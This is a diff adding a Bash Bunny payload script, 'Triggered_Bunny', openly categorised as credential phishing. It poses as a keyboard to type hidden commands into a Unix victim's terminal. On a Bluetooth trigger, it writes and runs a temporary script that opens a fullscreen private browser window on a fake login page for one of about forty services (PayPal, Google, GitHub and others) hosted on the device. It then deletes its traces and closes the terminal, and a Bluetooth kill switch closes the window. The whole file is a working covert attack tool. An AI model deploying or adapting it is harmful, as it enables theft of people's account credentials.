@@ -1,0 +1,329 @@
+#!/bin/bash
+
+# Description: Triggered_Bunny covertly executes phishing page on remote triggers.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Phishing/Credentials
+# Target: Unix-like operating systems.
+# Attackmodes: HID, ECM_ETHERNET
+
+ATTACKMODE ECM_ETHERNET HID
+Q DELAY 1000
+function browser() {
+	Q DELAY 1000
+        Q CTRL-ALT t
+        Q DELAY 1000
+        Q STRING echo -e "\"#\!/bin/bash\nfunction browser(){\n\tbrowser=\\\$(ls /bin/ | grep -Ew 'firefox|chromium|brave'| head -1)\n\tif [ \\\"\\\$browser\\\" = firefox ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --private-window)\n\t\texport execBrowser\n\telif [ \\\"\\\$browser\\\" = chromium ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --incognito)\n\t\texport execBrowser\n\telif [ \\\"\\\$browser\\\" = brave ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --incognito)\n\t\texport execBrowser\n\telse\n\t\techo \\\"Browser not found.\\\"\n\tfi\n}\nbrowser "\" \> /tmp/coco.sh
+        Q ENTER
+        Q DELAY 300        
+}
+function exec_rm(){
+	Q ENTER
+        Q DELAY 500
+        Q STRING bash /tmp/coco.sh \&\& rm /tmp/coco.sh \&\& exit
+        Q ENTER
+        Q DELAY 500
+        Q F11
+}
+function killl(){
+	stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+	stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+	sleep 1
+	echo -n -e "AT+ROLE=2" > /dev/ttyS1
+	echo -n -e "AT+RESET" > /dev/ttyS1
+	while true; do
+	timeout 5s cat /dev/ttyS1 > /tmp/bt_observation
+	if grep -ao $1 /tmp/bt_observation; then
+                Q CTRL w
+                break
+        fi
+	done
+}
+function templates() {	
+	while true; do
+	case "$template" in
+		adobe)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/adobe/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+		badoo)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/badoo/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                deviantart)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/deviantart/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                discord)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/discord/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                dropbox)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/dropbox/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                ebay)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/ebay/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                facebook)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/facebook/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                fb_advanced)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/fb_advanced/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                fb_messenger)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/fb_messenger/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                fb_security)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/fb_security/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                github)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/github/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                gitlab)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/gitlab/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                google)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/google/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                google_new)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/google_new/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                google_poll)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/google_poll/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                ig_verify)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/ig_verify/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                insta_followers)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/insta_followers/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                instagram)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/instagram/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                linkedin)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/linkedin/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                mediafire)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/mediafire/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                microsoft)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/microsoft/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                netflix)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/netflix/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                origin)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/origin/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                paypal)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/paypal/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                pinterest)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/pinterest/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                playstation)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/playstation/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                protonmail)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/protonmail/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                quora)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/quora/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                reddit)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/reddit/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                snapchat)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/snapchat/signin.php \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                spotify)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/spotify/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                stackoverflow)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/stackoverflow/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                steam)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/steam/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                tiktok)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/tiktok/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                twitch)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/twitch/user.php \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                twitter)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/twitter/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                vk)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/vk/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                vk_poll)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/vk_poll/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                wordpress)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/wordpress/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                xbox)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/xbox/index.php \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                yahoo)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/yahoo/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+                yandex)
+			browser
+			Q STRING echo ""\"\\\$execBrowser http://172.16.64.1/sites/yandex/login.html \&\" \>\> /tmp/coco.sh
+                	exec_rm
+                	break
+                ;;
+        	*)
+        		echo $template not found
+		;;
+	esac
+done
+}
+LED Y
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost
+service nginx start
+sleep 1
+echo -n -e "AT+ROLE=2" > /dev/ttyS1
+echo -n -e "AT+RESET" > /dev/ttyS1
+while true; do
+        timeout 5s cat /dev/ttyS1 > /tmp/bt_observation
+        template=$(grep -owaE 'adobe|badoo|deviantart|discord|dropbox|ebay|facebook|fb_advanced|fb_messenger|fb_security|github|gitlab|google|google_new|google_poll|ig_verify|insta_followers|instagram|linkedin|mediafire|microsoft|netflix|origin|paypal|pinterest|playstation|protonmail|quora|reddit|snapchat|spotify|stackoverflow|steam|tiktok|twitch|twitter|vk|vk_poll|wordpress|xbox|yahoo|yandex' /tmp/bt_observation)
+        echo $template
+        case "$template" in
+                adobe|badoo|deviantart|discord|dropbox|ebay|facebook|fb_advanced|fb_messenger|fb_security|github|gitlab|google|google_new|google_poll|ig_verify|insta_followers|instagram|linkedin|mediafire|microsoft|netflix|origin|paypal|pinterest|playstation|protonmail|quora|reddit|snapchat|spotify|stackoverflow|steam|tiktok|twitch|twitter|vk|vk_poll|wordpress|xbox|yahoo|yandex)
+                        echo $template found
+                        break
+                        ;;
+                *)
+                        echo $template not found
+                        ;;
+        esac
+done
+
+LED B
+templates
+LED M
+killl killswitch
+LED G
